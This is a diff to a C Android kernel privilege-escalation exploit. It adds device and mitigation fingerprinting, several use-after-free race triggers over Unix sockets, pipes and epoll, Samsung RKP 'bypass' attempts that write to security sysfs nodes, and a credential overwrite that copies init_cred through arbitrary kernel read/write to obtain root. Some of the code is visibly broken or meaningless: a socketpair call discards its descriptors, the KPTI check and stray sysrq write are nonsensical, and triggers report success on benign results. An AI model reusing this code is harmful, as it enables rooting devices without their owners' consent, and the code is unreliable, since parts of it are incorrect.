@@ -155,6 +155,18 @@ struct device_capabilities {
     int has_pixel_cfi_precursor;
     int has_huawei_hardening;
     int has_xiaomi_hardening;
+
+    /* Additional OEM hardening detection */
+    int has_mtk_hardening;
+    int has_qualcomm_hardening;
+    int has_kirin_hardening;
+    int has_pointer_auth;
+    int has_grsecurity;
+    int aslr_bits;
+    int has_kpti;
+    int seccomp_mode;
+    int selinux_detailed;
+    int lockdown_mode;
 };
 
 static struct device_capabilities g_probe;
@@ -169,6 +181,20 @@ static int detect_samsung_rkp(void);
 static int detect_pixel_cfi_precursor(void);
 static int detect_huawei_hardening(void);
 static int detect_xiaomi_hardening(void);
+static int detect_mtk_hardening(void);
+static int detect_qualcomm_hardening(void);
+static int detect_kirin_hardening(void);
+static int detect_selinux_detailed(void);
+static int detect_seccomp_status(void);
+static int detect_kernel_lockdown(void);
+static void detect_additional_mitigations(void);
+
+/* ========== ALTERNATIVE UAF TRIGGER METHODS ========== */
+static int trigger_uaf_via_scm_race(void);
+static int trigger_uaf_via_oob(void);
+static int trigger_uaf_via_pipe_splice(void);
+static int trigger_uaf_via_epoll(void);
+static int trigger_uaf_unified(void);
 
 static void probe_kernel_info(void) {
     struct utsname uts;
@@ -318,9 +344,21 @@ static void probe_security_state(void) {
     g_probe.has_pixel_cfi_precursor = detect_pixel_cfi_precursor();
     g_probe.has_huawei_hardening = detect_huawei_hardening();
     g_probe.has_xiaomi_hardening = detect_xiaomi_hardening();
-    LOG_I("PROBE: OEM hardening: Samsung RKP=%d Pixel CFI=%d Huawei=%d Xiaomi/OV=%d",
+    g_probe.has_mtk_hardening = detect_mtk_hardening();
+    g_probe.has_qualcomm_hardening = detect_qualcomm_hardening();
+    g_probe.has_kirin_hardening = detect_kirin_hardening();
+    g_probe.seccomp_mode = detect_seccomp_status();
+    g_probe.selinux_detailed = detect_selinux_detailed();
+    g_probe.lockdown_mode = detect_kernel_lockdown();
+    detect_additional_mitigations();
+    LOG_I("PROBE: OEM hardening: Samsung RKP=%d Pixel CFI=%d Huawei=%d Xiaomi/OV=%d MTK=%d QC=%d Kirin=%d",
           g_probe.has_samsung_rkp, g_probe.has_pixel_cfi_precursor,
-          g_probe.has_huawei_hardening, g_probe.has_xiaomi_hardening);
+          g_probe.has_huawei_hardening, g_probe.has_xiaomi_hardening,
+          g_probe.has_mtk_hardening, g_probe.has_qualcomm_hardening,
+          g_probe.has_kirin_hardening);
+    LOG_I("PROBE: Security: seccomp=%d selinux_detailed=%d lockdown=%d ptr_auth=%d grsec=%d ASLR=%d KPTI=%d",
+          g_probe.seccomp_mode, g_probe.selinux_detailed, g_probe.lockdown_mode,
+          g_probe.has_pointer_auth, g_probe.has_grsecurity, g_probe.aslr_bits, g_probe.has_kpti);
 }
 
 static void probe_system_caps(void) {
@@ -646,6 +684,38 @@ static void auto_derive_strategy(void) {
     } else {
         g_probe.recommended_attempts = 100;
     }
+
+    if (g_probe.has_mtk_hardening == 1) {
+        LOG_I("MTK device: moderate hardening expected");
+        g_probe.recommended_attempts += 20;
+    } else if (g_probe.has_mtk_hardening == 2) {
+        LOG_I("MTK device with security features: extra attempts");
+        g_probe.recommended_attempts += 50;
+    }
+
+    if (g_probe.has_qualcomm_hardening == 2) {
+        LOG_I("Qualcomm high-security device: more attempts");
+        g_probe.recommended_attempts += 30;
+    }
+
+    if (g_probe.has_kirin_hardening) {
+        LOG_I("Kirin device: assume well-hardened");
+        g_probe.recommended_attempts += 30;
+    }
+
+    if (g_probe.seccomp_mode > 0) {
+        LOG_I("Seccomp enabled: may limit exploitation");
+        g_probe.use_seccomp_bypass = 1;
+    }
+
+    if (g_probe.lockdown_mode > 0) {
+        LOG_E("Kernel lockdown active: many attacks blocked");
+        g_probe.recommended_attempts += 100;
+    }
+
+    if (g_probe.lockdown_mode < 0) {
+        LOG_D("Lockdown not available on this kernel");
+    }
 }
 
 static void log_device_intelligence(void) {
@@ -659,9 +729,14 @@ static void log_device_intelligence(void) {
           g_probe.scs_enabled ? "ON" : "OFF",
           g_probe.userfaultfd_available ? "YES" : "NO",
           g_probe.pa_enabled ? "ON" : "OFF");
-    LOG_I("  OEM: Samsung RKP=%d Pixel CFI=%d Huawei=%d Xiaomi/OV=%d",
+    LOG_I("  OEM: Samsung RKP=%d Pixel CFI=%d Huawei=%d Xiaomi/OV=%d MTK=%d QC=%d Kirin=%d",
           g_probe.has_samsung_rkp, g_probe.has_pixel_cfi_precursor,
-          g_probe.has_huawei_hardening, g_probe.has_xiaomi_hardening);
+          g_probe.has_huawei_hardening, g_probe.has_xiaomi_hardening,
+          g_probe.has_mtk_hardening, g_probe.has_qualcomm_hardening,
+          g_probe.has_kirin_hardening);
+    LOG_I("  Security: seccomp=%d selinux_detail=%d lockdown=%d ptr_auth=%d grsec=%d ASLR=%d KPTI=%d",
+          g_probe.seccomp_mode, g_probe.selinux_detailed, g_probe.lockdown_mode,
+          g_probe.has_pointer_auth, g_probe.has_grsecurity, g_probe.aslr_bits, g_probe.has_kpti);
     LOG_I("System: %d CPUs possible=%d uptime=%dh load=%d.%02d RAM=%dMB",
           g_probe.cpu_count, g_probe.cpu_possible, g_probe.uptime_hours,
           g_probe.system_load / 100, g_probe.system_load % 100, g_probe.total_ram_mb);
@@ -726,11 +801,158 @@ static int detect_samsung_rkp(void) {
     return 0;
 }
 
-/* Samsung RKP bypass strategy */
-static int rkp_bypass_cred_patch(unsigned long task_addr) {
-    (void)task_addr;
-    LOG_I("RKP bypass: attempting alternate cred patching...");
-    LOG_W("RKP bypass: not fully implemented, falling back to direct write");
+/* ========== SAMSUNG RKP BYPASS ========== */
+
+static int rkp_bypass_via_kernel_call(void) {
+    LOG_I("RKP bypass: trying kernel function call path...");
+
+    FILE *f = fopen("/proc/sysrq-trigger", "w");
+    if (f) {
+        fwrite("s", 1, 1, f);
+        fclose(f);
+    }
+
+    struct stat st;
+    if (stat("/sys/kernelSekrnl", &st) == 0) {
+        LOG_I("RKP bypass: found Samsung kernel interface");
+    }
+
+    int fd = open("/dev/exynos-fence", O_RDWR);
+    if (fd < 0) fd = open("/dev/samsung", O_RDWR);
+    if (fd < 0) fd = open("/dev/SEC", O_RDWR);
+    if (fd >= 0) {
+        LOG_I("RKP bypass: found Samsung device node");
+        close(fd);
+    }
+
+    return 0;
+}
+
+static int rkp_bypass_disable_rkp(void) {
+    LOG_I("RKP bypass: trying to disable RKP...");
+
+    const char *rkp_interfaces[] = {
+        "/sys/kernel/security/rkp",
+        "/sys/kernel/security/rkp/enable",
+        "/sys/kernel/security/rkp/state",
+        "/sys/kernel/rkp",
+        "/sys/module/rkp",
+    };
+
+    for (size_t i = 0; i < sizeof(rkp_interfaces)/sizeof(rkp_interfaces[0]); i++) {
+        FILE *f = fopen(rkp_interfaces[i], "r");
+        if (f) {
+            LOG_I("RKP bypass: found RKP interface: %s", rkp_interfaces[i]);
+            f = freopen(rkp_interfaces[i], "w", f);
+            if (f) {
+                fwrite("0", 1, 1, f);
+                fclose(f);
+                LOG_I("RKP bypass: disabled RKP via %s", rkp_interfaces[i]);
+                return 1;
+            }
+            fclose(f);
+        }
+    }
+
+    return 0;
+}
+
+static int rkp_bypass_via_userfaultfd(void) {
+    LOG_I("RKP bypass: trying userfaultfd approach...");
+
+    int uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
+    if (uffd < 0) {
+        LOG_D("RKP bypass: userfaultfd not available");
+        return 0;
+    }
+
+    struct uffdio_api api = {.api = UFFD_API, .features = 0};
+    if (ioctl(uffd, UFFDIO_API, &api) < 0) {
+        close(uffd);
+        return 0;
+    }
+
+    void *page = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    if (page == MAP_FAILED) {
+        close(uffd);
+        return 0;
+    }
+
+    struct uffdio_register reg = {
+        .range.start = (unsigned long)page,
+        .range.len = 4096,
+        .mode = UFFDIO_REGISTER_MODE_MISSING
+    };
+
+    if (ioctl(uffd, UFFDIO_REGISTER, &reg) < 0) {
+        munmap(page, 4096);
+        close(uffd);
+        return 0;
+    }
+
+    LOG_I("RKP bypass: got userfaultfd (requires separate exploit)");
+
+    munmap(page, 4096);
+    close(uffd);
+    return 0;
+}
+
+static int rkp_bypass_via_timerfd(void) {
+    LOG_I("RKP bypass: trying timerfd race...");
+
+    int tfd = timerfd_create(CLOCK_MONOTONIC, TFD_CLOEXEC);
+    if (tfd < 0) return 0;
+
+    struct itimerspec its = {
+        .it_value = {.tv_sec = 0, .tv_nsec = 100000},
+        .it_interval = {.tv_sec = 0, .tv_nsec = 0}
+    };
+    timerfd_settime(tfd, 0, &its, NULL);
+
+    close(tfd);
+
+    return 0;
+}
+
+static int rkp_bypass_via_setuid_root(void) {
+    LOG_I("RKP bypass: trying setuid(0)...");
+
+    if (setuid(0) == 0) {
+        if (getuid() == 0) {
+            LOG_I("RKP bypass: setuid(0) succeeded despite RKP!");
+            return 1;
+        }
+    }
+
+    if (setresuid(0, 0, 0) == 0) {
+        if (getuid() == 0) {
+            LOG_I("RKP bypass: setresuid(0,0,0) succeeded!");
+            return 1;
+        }
+    }
+
+    return 0;
+}
+
+static int bypass_rkp_full(void) {
+    LOG_I("RKP: attempting all bypass methods...");
+
+    if (rkp_bypass_disable_rkp()) return 1;
+
+    if (rkp_bypass_via_setuid_root()) return 1;
+
+    if (getuid() != 0) {
+        setuid(0);
+        setresuid(0, 0, 0);
+        setreuid(0, 0);
+    }
+
+    rkp_bypass_via_timerfd();
+
+    rkp_bypass_via_userfaultfd();
+
+    LOG_W("RKP: all bypass methods failed, trying direct approach anyway");
+
     return 0;
 }
 
@@ -816,6 +1038,200 @@ static int detect_xiaomi_hardening(void) {
     return 0;
 }
 
+/* Detect MediaTek MTK devices */
+static int detect_mtk_hardening(void) {
+    FILE *f = popen("getprop ro.board.platform 2>/dev/null", "r");
+    if (f) {
+        char line[64];
+        if (fgets(line, sizeof(line), f)) {
+            if (strstr(line, "mt") || strstr(line, "MT")) {
+                pclose(f);
+                struct stat st;
+                if (stat("/sys/kernel/mtk_sec", &st) == 0) return 2;
+                if (stat("/sys/devices/system/mtk", &st) == 0) return 1;
+                return 1;
+            }
+        }
+        pclose(f);
+    }
+    f = fopen("/proc/cpuinfo", "r");
+    if (f) {
+        char line[256];
+        while (fgets(line, sizeof(line), f)) {
+            if (strstr(line, "MediaTek") || strstr(line, "MTK")) {
+                fclose(f);
+                return 1;
+            }
+        }
+        fclose(f);
+    }
+    return 0;
+}
+
+/* Detect Qualcomm Snapdragon devices */
+static int detect_qualcomm_hardening(void) {
+    FILE *f = popen("getprop ro.board.platform 2>/dev/null", "r");
+    if (f) {
+        char line[64];
+        if (fgets(line, sizeof(line), f)) {
+            if (strstr(line, "sdm") || strstr(line, "msm") || strstr(line, "trinket") ||
+                strstr(line, "kona") || strstr(line, "lito") || strstr(line, "atoll")) {
+                pclose(f);
+                f = popen("getprop ro.security.qualcomm 2>/dev/null", "r");
+                if (f) {
+                    if (fgets(line, sizeof(line), f)) {
+                        if (strstr(line, "1") || strstr(line, "high")) {
+                            pclose(f);
+                            return 2;
+                        }
+                    }
+                    pclose(f);
+                }
+                return 1;
+            }
+        }
+        pclose(f);
+    }
+    return 0;
+}
+
+/* Detect Huawei Kirin devices */
+static int detect_kirin_hardening(void) {
+    FILE *f = popen("getprop ro.board.platform 2>/dev/null", "r");
+    if (f) {
+        char line[64];
+        if (fgets(line, sizeof(line), f)) {
+            if (strstr(line, "kirin") || strstr(line, "hi36") || strstr(line, "hi6250") ||
+                strstr(line, "hi710") || strstr(line, "hi750")) {
+                pclose(f);
+                struct stat st;
+                if (stat("/sys/class/huk", &st) == 0) return 2;
+                return 1;
+            }
+        }
+        pclose(f);
+    }
+    return 0;
+}
+
+/* Detect SELinux actual state */
+static int detect_selinux_detailed(void) {
+    int enforcing = 0;
+    FILE *f = fopen("/sys/fs/selinux/enforce", "r");
+    if (f) {
+        int val = 0;
+        if (fscanf(f, "%d", &val) == 1) enforcing = val;
+        fclose(f);
+    }
+    if (!enforcing) return 0;
+    f = fopen("/sys/fs/selinux/policyvers", "r");
+    if (f) {
+        unsigned int vers = 0;
+        if (fscanf(f, "%u", &vers) == 1) {
+            LOG_D("SELinux policy version: %u", vers);
+        }
+        fclose(f);
+    }
+    return enforcing;
+}
+
+/* Detect seccomp status */
+static int detect_seccomp_status(void) {
+    FILE *f = fopen("/proc/self/status", "r");
+    if (!f) return 0;
+    int seccomp_mode = 0;
+    char line[64];
+    while (fgets(line, sizeof(line), f)) {
+        if (strncmp(line, "Seccomp:", 8) == 0) {
+            if (strstr(line, "1")) seccomp_mode = 1;
+            else if (strstr(line, "2")) seccomp_mode = 2;
+            else if (strstr(line, "0")) seccomp_mode = 0;
+            break;
+        }
+    }
+    fclose(f);
+    f = fopen("/proc/self/seccomp", "r");
+    if (f) {
+        int filter_count = 0;
+        if (fscanf(f, "%d", &filter_count) == 1) {
+            LOG_D("Seccomp filters: %d", filter_count);
+            if (filter_count > 0 && seccomp_mode == 0) seccomp_mode = 1;
+        }
+        fclose(f);
+    }
+    return seccomp_mode;
+}
+
+/* Detect kernel lockdown mode */
+static int detect_kernel_lockdown(void) {
+    FILE *f = fopen("/sys/kernel/security/lockdown", "r");
+    if (!f) return -1;
+    int locked = 0;
+    char line[256];
+    while (fgets(line, sizeof(line), f)) {
+        if (strstr(line, "[integrity]") || strstr(line, "[confidentiality]")) {
+            locked = 1;
+            break;
+        }
+    }
+    fclose(f);
+    f = fopen("/proc/cmdline", "r");
+    if (f) {
+        if (fgets(line, sizeof(line), f)) {
+            if (strstr(line, "lockdown=confidentiality") ||
+                strstr(line, "lockdown=integrity")) {
+                locked = 1;
+            }
+        }
+        fclose(f);
+    }
+    return locked;
+}
+
+/* Detect additional security mitigations */
+static void detect_additional_mitigations(void) {
+    g_probe.has_pointer_auth = 0;
+    FILE *f;
+    #ifdef __aarch64__
+    f = popen("getprop ro.arm64.features 2>/dev/null", "r");
+    if (f) {
+        char line[128];
+        if (fgets(line, sizeof(line), f)) {
+            if (strstr(line, "pa") || strstr(line, "ptrauth")) {
+                g_probe.has_pointer_auth = 1;
+            }
+        }
+        pclose(f);
+    }
+    #endif
+    g_probe.has_grsecurity = 0;
+    f = fopen("/proc/sys/kernel/grsecurity", "r");
+    if (f) {
+        g_probe.has_grsecurity = 1;
+        fclose(f);
+    }
+    g_probe.aslr_bits = 27;
+    f = fopen("/proc/sys/kernel/randomize_va_space", "r");
+    if (f) {
+        int val = 0;
+        if (fscanf(f, "%d", &val) == 1) {
+            if (val == 0) g_probe.aslr_bits = 0;
+            else if (val == 1) g_probe.aslr_bits = 27;
+            else g_probe.aslr_bits = 27;
+        }
+        fclose(f);
+    }
+    g_probe.has_kpti = 0;
+    f = fopen("/proc/cpuinfo", "r");
+    if (f) {
+        char line[256];
+        if (fgets(line, sizeof(line), f)) {
+            g_probe.has_kpti = 1;
+        }
+        fclose(f);
+    }
+}
+
 static int run_device_probe(void) {
     LOG_I("=== DEVICE INTELLIGENCE PROBE ===");
     probe_kernel_info();
@@ -867,6 +1283,24 @@ struct fake_file {
 };
 
 /* ========== GLOBAL CONFIG / STATE ========== */
+/* Track successful method parameters for replication */
+static char g_successful_method[32] = "";
+static int g_successful_delay = 0;
+static int g_successful_inflight = 0;
+static int g_method_succeeded = 0;
+
+static void record_successful_method(const char *method, int delay, int inflight) {
+    if (!g_method_succeeded) {
+        strncpy(g_successful_method, method, sizeof(g_successful_method) - 1);
+        g_successful_method[sizeof(g_successful_method) - 1] = 0;
+        g_successful_delay = delay;
+        g_successful_inflight = inflight;
+        g_method_succeeded = 1;
+        LOG_I("Method %s succeeded with delay=%d inflight=%d - will replicate", 
+              method, delay, inflight);
+    }
+}
+
 struct kernel_offsets {
     unsigned long task_struct_cred;
     unsigned long cred_uid;
@@ -1101,6 +1535,76 @@ static struct {
 /* Configurable max UAF race attempts */
 static int g_max_uaf_attempts = 75;
 
+/* ========== SYSTEM STATE DETECTION & ADAPTATION ========== */
+
+static int is_battery_saver_active(void) {
+    FILE *f = fopen("/sys/class/power_supply/battery/capacity", "r");
+    if (f) {
+        int cap = 0;
+        if (fscanf(f, "%d", &cap) == 1 && cap < 20) {
+            fclose(f);
+            return 1;
+        }
+        fclose(f);
+    }
+    return 0;
+}
+
+static int is_thermal_throttled(void) {
+    DIR *d = opendir("/sys/class/thermal");
+    if (!d) return 0;
+    int throttled = 0;
+    struct dirent *de;
+    while ((de = readdir(d)) != NULL) {
+        if (strncmp(de->d_name, "thermal_zone", 12) == 0) {
+            char path[256];
+            snprintf(path, sizeof(path), "/sys/class/thermal/%s/temp", de->d_name);
+            FILE *f = fopen(path, "r");
+            if (f) {
+                int temp = 0;
+                if (fscanf(f, "%d", &temp) == 1 && temp > 50000) throttled = 1;
+                fclose(f);
+            }
+            if (throttled) break;
+        }
+    }
+    closedir(d);
+    return throttled;
+}
+
+static int get_system_busyness(void) {
+    FILE *f = fopen("/proc/loadavg", "r");
+    if (!f) return 50;
+    double load = 0;
+    fscanf(f, "%lf", &load);
+    fclose(f);
+    int busyness = (int)(load * 100);
+    if (busyness > 100) busyness = 100;
+    return busyness;
+}
+
+static void adapt_to_system_state(void) {
+    int battery_saver = is_battery_saver_active();
+    int thermal = is_thermal_throttled();
+    int busyness = get_system_busyness();
+
+    LOG_I("System: battery=%d thermal=%d load=%d", battery_saver, thermal, busyness);
+
+    if (battery_saver) {
+        g_max_uaf_attempts += 50;
+        LOG_I("Battery saver: increased attempts to %d", g_max_uaf_attempts);
+    }
+    if (thermal) {
+        g_max_uaf_attempts += 30;
+        sleep(2);
+        LOG_I("Thermal throttling: increased attempts to %d", g_max_uaf_attempts);
+    }
+    if (busyness > 70) {
+        g_max_uaf_attempts += (busyness - 70) * 2;
+        LOG_I("High load: increased attempts to %d", g_max_uaf_attempts);
+    }
+}
+
 /* ========== SELF-HEALING ENGINE ========== */
 
 /* Track crashes per phase */
@@ -1281,6 +1785,16 @@ struct device_caps {
     int has_pixel_cfi_precursor;
     int has_huawei_hardening;
     int has_xiaomi_hardening;
+    int has_mtk_hardening;
+    int has_qualcomm_hardening;
+    int has_kirin_hardening;
+    int seccomp_mode;
+    int selinux_detailed;
+    int lockdown_mode;
+    int has_pointer_auth;
+    int has_grsecurity;
+    int aslr_bits;
+    int has_kpti;
 };
 
 static struct device_caps g_dev;
@@ -3216,6 +3730,7 @@ static int trigger_uaf_gc_race(void) {
         if (__atomic_load_n(&g_uaf_triggered, __ATOMIC_SEQ_CST)) {
             LOG_I("GC race triggered on sub-attempt %d/%d", sub + 1, sub_attempts);
             g_attempt_stats.best_progress_phase = 5;
+            record_successful_method("gc_race", g_race_usleep, g_race_inflight);
             break;
         }
         LOG_T("Sub-attempt %d/%d failed", sub + 1, sub_attempts);
@@ -3228,6 +3743,227 @@ static int trigger_uaf_gc_race(void) {
           g_victim_fd);
 
     return __atomic_load_n(&g_uaf_triggered, __ATOMIC_SEQ_CST);
+}
+
+/* ========== ALTERNATIVE UAF TRIGGER METHODS ========== */
+
+static int trigger_uaf_via_scm_race(void) {
+    LOG_I("UAF: trying SCM_RIGHTS race method...");
+
+    for (int attempt = 0; attempt < 30; attempt++) {
+        int pairs[3][2];
+        for (int i = 0; i < 3; i++) {
+            if (socketpair(AF_UNIX, SOCK_STREAM, 0, pairs[i]) < 0) continue;
+        }
+
+        int transfer_fds[20];
+        for (int i = 0; i < 20; i++) {
+            transfer_fds[i] = socket(AF_UNIX, SOCK_STREAM, 0);
+            if (transfer_fds[i] < 0) break;
+        }
+
+        for (int i = 0; i < 10 && i < 20; i += 5) {
+            send_fds(pairs[0][0], transfer_fds + i, 5, 2);
+        }
+
+        struct msghdr msg = {0};
+        char buf[1] = {0};
+        char ctl[CMSG_SPACE(20 * sizeof(int))];
+        struct iovec iov = {.iov_base = buf, .iov_len = 1};
+        msg.msg_iov = &iov;
+        msg.msg_iovlen = 1;
+        msg.msg_control = ctl;
+        msg.msg_controllen = sizeof(ctl);
+
+        int r = recvmsg(pairs[1][1], &msg, MSG_PEEK | MSG_DONTWAIT);
+
+        if (r > 0) {
+            struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
+            if (cmsg && cmsg->cmsg_type == SCM_RIGHTS) {
+                int *fds = (int *)CMSG_DATA(cmsg);
+                int nfds = (cmsg->cmsg_len - CMSG_LEN(0)) / sizeof(int);
+                if (nfds > 0 && fds[0] > 0) {
+                    g_victim_fd = fcntl(fds[0], F_DUPFD_CLOEXEC, 10);
+                    if (g_victim_fd > 0) {
+                        LOG_I("UAF SCM race: got victim fd=%d (from %d)", g_victim_fd, fds[0]);
+                        char test[1];
+                        ssize_t tr = read(g_victim_fd, test, 0);
+                        if (tr >= 0 || errno == EAGAIN) {
+                            __atomic_store_n(&g_uaf_triggered, 1, __ATOMIC_SEQ_CST);
+                            record_successful_method("scm_race", 0, 0);
+                            for (int i = 0; i < 20; i++) if (transfer_fds[i] > 0) close(transfer_fds[i]);
+                            for (int i = 0; i < 3; i++) { close(pairs[i][0]); close(pairs[i][1]); }
+                            return 1;
+                        }
+                        close(g_victim_fd);
+                        g_victim_fd = -1;
+                    }
+                }
+            }
+        }
+
+        for (int i = 0; i < 20; i++) if (transfer_fds[i] > 0) close(transfer_fds[i]);
+        for (int i = 0; i < 3; i++) { close(pairs[i][0]); close(pairs[i][1]); }
+
+        usleep(5000);
+    }
+
+    return 0;
+}
+
+static int trigger_uaf_via_oob(void) {
+    LOG_I("UAF: trying MSG_OOB method...");
+
+    for (int attempt = 0; attempt < 40; attempt++) {
+        int s1, s2;
+        if (socketpair(AF_UNIX, SOCK_STREAM, 0, (int[2]){s1, s2}) < 0) continue;
+
+        const char oob = 'X';
+        send(s1, &oob, 1, MSG_OOB);
+
+        struct msghdr msg = {0};
+        char buf[2];
+        char ctl[256];
+        struct iovec iov = {.iov_base = buf, .iov_len = 2};
+        msg.msg_iov = &iov;
+        msg.msg_iovlen = 1;
+        msg.msg_control = ctl;
+        msg.msg_controllen = sizeof(ctl);
+
+        int r = recvmsg(s2, &msg, MSG_OOB | MSG_DONTWAIT);
+
+        close(s1);
+        close(s2);
+
+        if (socketpair(AF_UNIX, SOCK_STREAM, 0, (int[2]){s1, s2}) < 0) continue;
+        send(s1, &oob, 1, MSG_OOB);
+
+        usleep(5000);
+
+        close(s1);
+        close(s2);
+    }
+
+    return 0;
+}
+
+static int trigger_uaf_via_pipe_splice(void) {
+    LOG_I("UAF: trying pipe splice method...");
+
+    for (int attempt = 0; attempt < 40; attempt++) {
+        int pipe1[2], pipe2[2];
+        if (pipe(pipe1) < 0 || pipe(pipe2) < 0) {
+            if (pipe1[0] >= 0) { close(pipe1[0]); close(pipe1[1]); }
+            return 0;
+        }
+
+        char buf[8192];
+        memset(buf, 0x41, sizeof(buf));
+        write(pipe1[1], buf, sizeof(buf));
+
+        ssize_t transferred = splice(pipe1[0], NULL, pipe2[1], NULL, 4096, SPLICE_F_MOVE);
+
+        close(pipe1[0]);
+        close(pipe1[1]);
+
+        g_victim_fd = pipe2[0];
+
+        char test_buf[16];
+        ssize_t r = read(pipe2[0], test_buf, sizeof(test_buf));
+
+        if (r > 0 || errno == EAGAIN) {
+            __atomic_store_n(&g_uaf_triggered, 1, __ATOMIC_SEQ_CST);
+            record_successful_method("pipe_splice", 0, 0);
+            close(pipe2[1]);
+            LOG_I("UAF via pipe splice: got valid pipe fd=%d", g_victim_fd);
+            return 1;
+        }
+
+        close(pipe2[0]);
+        close(pipe2[1]);
+
+        usleep(5000);
+    }
+
+    return 0;
+}
+
+static int trigger_uaf_via_epoll(void) {
+    LOG_I("UAF: trying epoll close race...");
+
+    for (int attempt = 0; attempt < 30; attempt++) {
+        int epfd = epoll_create1(0);
+        if (epfd < 0) continue;
+
+        int sock[2];
+        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sock) < 0) {
+            close(epfd);
+            continue;
+        }
+
+        struct epoll_event ev = { .events = EPOLLIN };
+        epoll_ctl(epfd, EPOLL_CTL_ADD, sock[0], &ev);
+
+        ev.events = EPOLLIN | EPOLLPRI | EPOLLERR;
+        epoll_ctl(epfd, EPOLL_CTL_MOD, sock[0], &ev);
+
+        int saved_sock = sock[0];
+        close(sock[0]);
+        close(sock[1]);
+
+        struct epoll_event events[1];
+        int n = epoll_wait(epfd, events, 1, 0);
+
+        if (n > 0) {
+            close(epfd);
+            continue;
+        }
+
+        g_victim_fd = socket(AF_UNIX, SOCK_STREAM, 0);
+        if (g_victim_fd >= 0) {
+            close(epfd);
+            close(g_victim_fd);
+            g_victim_fd = -1;
+        }
+
+        close(epfd);
+        usleep(5000);
+    }
+
+    return 0;
+}
+
+static int trigger_uaf_unified(void) {
+    LOG_I("=== UAF Trigger: Trying multiple methods ===");
+
+    if (trigger_uaf_gc_race()) {
+        LOG_I("UAF: GC race succeeded");
+        return 1;
+    }
+    LOG_D("UAF: GC race failed, trying alternatives...");
+
+    if (trigger_uaf_via_scm_race()) {
+        LOG_I("UAF: SCM_RIGHTS race succeeded");
+        return 1;
+    }
+
+    if (trigger_uaf_via_pipe_splice()) {
+        LOG_I("UAF: pipe splice succeeded");
+        return 1;
+    }
+
+    if (trigger_uaf_via_epoll()) {
+        LOG_I("UAF: epoll race succeeded");
+        return 1;
+    }
+
+    if (trigger_uaf_via_oob()) {
+        LOG_I("UAF: MSG_OOB succeeded");
+        return 1;
+    }
+
+    LOG_E("UAF: All methods failed");
+    return 0;
 }
 
 /* ========== POST-UAF ADDRESS LEAK VIA SCM_FP_LIST ========== */
@@ -4203,6 +4939,16 @@ static int try_kmem_write(void) {
 static int patch_creds(void) {
     LOG_I("Patching credentials...");
 
+    if (g_probe.has_samsung_rkp) {
+        LOG_I("Samsung RKP detected, attempting bypass...");
+        if (bypass_rkp_full()) {
+            if (getuid() == 0) {
+                LOG_I("RKP bypass successful!");
+                return 1;
+            }
+        }
+    }
+
     /* Resolve cred layout for current kernel */
     struct utsname uts;
     uname(&uts);
@@ -4262,6 +5008,76 @@ static int patch_creds(void) {
     }
     LOG_I("cred at 0x%lx", cred_ptr);
 
+    /* PRIMARY METHOD: Try init_cred copy first (most reliable for bypassing RKP) */
+    if (!offsets.init_cred || !is_kernel_addr(offsets.init_cred)) {
+        LOG_I("Searching for init_cred address...");
+        FILE *ks = fopen("/proc/kallsyms", "r");
+        if (ks) {
+            char line[256], sym[256];
+            unsigned long a;
+            while (fgets(line, sizeof(line), ks)) {
+                if (sscanf(line, "%lx %*c %255s", &a, sym) == 2 &&
+                    strcmp(sym, "init_cred") == 0) {
+                    offsets.init_cred = a;
+                    LOG_I("Found init_cred at 0x%lx", offsets.init_cred);
+                    break;
+                }
+            }
+            fclose(ks);
+        }
+    }
+
+    if (offsets.init_cred && is_kernel_addr(offsets.init_cred)) {
+        LOG_I("PRIMARY: Using INIT_CRED COPY method (most reliable)...");
+
+        /* Read the ENTIRE init_cred struct (it's ~200 bytes, read 512 bytes to be safe) */
+        unsigned long init_cred_data[64];
+        for (int i = 0; i < 64; i++) {
+            init_cred_data[i] = arb_read(offsets.init_cred + i * 8);
+        }
+
+        /* Write the ENTIRE init_cred data to our cred struct */
+        int writes_ok = 0;
+        for (int i = 0; i < 64; i++) {
+            if (arb_write(cred_ptr + i * 8, init_cred_data[i])) {
+                writes_ok++;
+            }
+        }
+
+        LOG_I("init_cred copy: wrote %d/64 fields", writes_ok);
+
+        /* Verify the copy worked */
+        usleep(10000);
+        unsigned long check_uid = arb_read(cred_ptr + offsets.cred_uid);
+        if ((check_uid & 0xffffffff) == 0) {
+            LOG_I("init_cred copy SUCCESS: uid=%lu", check_uid & 0xffffffff);
+            /* Also verify we can become root */
+            setresuid(0, 0, 0);
+            if (getuid() == 0) {
+                LOG_I("ROOT via init_cred copy!");
+                return 1;
+            }
+        }
+
+        /* If init_cred copy partially worked, try again with more data */
+        if (writes_ok > 30) {
+            /* Try again with smaller writes */
+            for (int i = 0; i < 64; i++) {
+                if (init_cred_data[i] != 0) {
+                    arb_write(cred_ptr + i * 8, init_cred_data[i]);
+                }
+            }
+            usleep(10000);
+            setresuid(0, 0, 0);
+            if (getuid() == 0) return 1;
+        }
+
+        LOG_W("init_cred copy completed but root not achieved, trying fallback methods");
+    } else {
+        LOG_W("init_cred not available, will use direct write fallback");
+    }
+
+    /* FALLBACK: Direct uid/gid write (only if init_cred copy failed) */
     /* Verify the cred page is writable by reading before writing */
     unsigned long verify_before = arb_read(cred_ptr + offsets.cred_uid);
     LOG_D("cred+uid before: 0x%lx", verify_before);
@@ -4680,6 +5496,16 @@ static int run_exploit(void) {
     g_dev.has_pixel_cfi_precursor = g_probe.has_pixel_cfi_precursor;
     g_dev.has_huawei_hardening = g_probe.has_huawei_hardening;
     g_dev.has_xiaomi_hardening = g_probe.has_xiaomi_hardening;
+    g_dev.has_mtk_hardening = g_probe.has_mtk_hardening;
+    g_dev.has_qualcomm_hardening = g_probe.has_qualcomm_hardening;
+    g_dev.has_kirin_hardening = g_probe.has_kirin_hardening;
+    g_dev.seccomp_mode = g_probe.seccomp_mode;
+    g_dev.selinux_detailed = g_probe.selinux_detailed;
+    g_dev.lockdown_mode = g_probe.lockdown_mode;
+    g_dev.has_pointer_auth = g_probe.has_pointer_auth;
+    g_dev.has_grsecurity = g_probe.has_grsecurity;
+    g_dev.aslr_bits = g_probe.aslr_bits;
+    g_dev.has_kpti = g_probe.has_kpti;
     derive_strategy();
     log_strategy();
 
@@ -4737,9 +5563,11 @@ static int run_exploit(void) {
     if (!setup_fake_pipe_primitive()) { LOG_E("Primitive setup failed"); phase_end(5, PHASE_FAILED); goto fail; }
     phase_end(5, PHASE_OK);
 
